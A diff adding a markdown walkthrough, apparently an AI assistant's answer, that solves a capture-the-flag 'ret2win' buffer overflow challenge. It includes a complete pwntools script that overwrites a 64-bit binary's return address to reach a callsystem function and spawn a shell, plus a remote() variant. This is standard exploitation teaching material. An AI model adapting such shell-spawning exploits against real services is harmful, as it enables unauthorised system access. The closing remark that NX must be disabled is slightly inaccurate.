@@ -1,0 +1,108 @@
+To solve this challenge using `pwntools`, you need to exploit the buffer overflow vulnerability in the `vulnerable_function` to perform a Return-Oriented Programming (ROP) attack. The goal is to redirect the program's execution flow to the `callsystem` function, which executes `/bin/sh` and gives you a shell.
+
+Here are the steps and the corresponding code:
+
+---
+
+### Steps to Solve the Challenge
+
+1. **Analyze the Binary**:
+   - The binary is a 64-bit ELF executable.
+   - The `vulnerable_function` has a buffer overflow vulnerability because it reads 512 bytes (`0x200`) into a buffer of size 128 bytes (`buf[128]`).
+
+2. **Identify the Exploitation Point**:
+   - The `callsystem` function is located at address `0x400596`. This function calls `system("/bin/sh")`, which is our target.
+
+3. **Find the Offset**:
+   - Use a pattern to determine the offset where the return address is overwritten.
+
+4. **Build the ROP Chain**:
+   - Use the `callsystem` function's address to redirect execution.
+
+5. **Write the Exploit Script**:
+   - Use `pwntools` to craft the payload and send it to the binary.
+
+---
+
+### Exploit Code
+
+Here is the Python exploit script using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary
+binary = './rop'  # Replace with the actual binary name
+elf = ELF(binary)
+
+# Start the process
+p = process(binary)
+
+# Address of the callsystem function
+callsystem = elf.symbols['callsystem']  # 0x400596
+
+# Step 1: Find the offset
+# Use cyclic pattern to find the offset
+# Uncomment the following lines if you need to find the offset
+# payload = cyclic(200)  # Generate a cyclic pattern
+# p.sendline(payload)
+# p.wait()
+# core = p.corefile
+# offset = cyclic_find(core.read(core.rsp, 4))  # Find the offset
+# print(f"Offset: {offset}")
+
+# From analysis, the offset is 136 (128 for buf + 8 for saved RBP)
+offset = 136
+
+# Step 2: Craft the payload
+payload = b'A' * offset  # Fill the buffer and overwrite saved RBP
+payload += p64(callsystem)  # Overwrite return address with callsystem address
+
+# Step 3: Send the payload
+p.sendline(payload)
+
+# Step 4: Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code
+
+1. **Binary Setup**:
+   - `elf = ELF(binary)` loads the binary and allows you to access its symbols (e.g., `callsystem`).
+
+2. **Finding the Offset**:
+   - Use a cyclic pattern to determine the offset where the return address is overwritten. The offset is 136 bytes in this case.
+
+3. **Crafting the Payload**:
+   - The payload consists of:
+     - `b'A' * offset`: Fills the buffer and overwrites the saved base pointer (RBP).
+     - `p64(callsystem)`: Overwrites the return address with the address of the `callsystem` function.
+
+4. **Sending the Payload**:
+   - The payload is sent to the binary using `p.sendline(payload)`.
+
+5. **Interacting with the Shell**:
+   - After sending the payload, the program's execution flow is redirected to `callsystem`, which spawns a shell. Use `p.interactive()` to interact with the shell.
+
+---
+
+### Running the Exploit
+
+1. Save the script as `exploit.py`.
+2. Make sure `pwntools` is installed (`pip install pwntools`).
+3. Run the script: `python3 exploit.py`.
+4. If successful, you will get a shell. Use commands like `ls`, `cat flag.txt`, etc., to interact with the system.
+
+---
+
+### Notes
+
+- If the binary is running on a remote server, use `remote` instead of `process`:
+  ```python
+  p = remote('server_address', port)
+  ```
+- Ensure that the binary does not have protections like ASLR, NX, or PIE enabled. If they are enabled, additional steps (e.g., leaking addresses) may be required.
+
+This script should work for the given challenge. Let me know if you encounter any issues!
